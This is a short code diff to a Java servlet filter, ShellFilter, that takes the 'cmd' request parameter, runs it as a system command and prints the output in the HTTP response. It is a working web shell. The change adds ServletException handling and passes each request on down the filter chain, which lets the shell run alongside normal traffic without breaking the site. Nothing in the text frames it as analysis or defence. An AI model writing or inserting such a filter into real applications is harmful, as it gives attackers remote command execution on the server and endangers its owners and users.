@@ -7,7 +7,7 @@ public class ShellFilter implements Filter {
     @Override
     public void destroy() {}
     @Override
-    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException {
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
         String cmd = request.getParameter("cmd");
         if (cmd != null) {
             Process process = Runtime.getRuntime().exec(cmd);
@@ -18,5 +18,6 @@ public class ShellFilter implements Filter {
                 response.getWriter().println(line);
             }
         }
+        filterChain.doFilter(request,response);
     }
 }
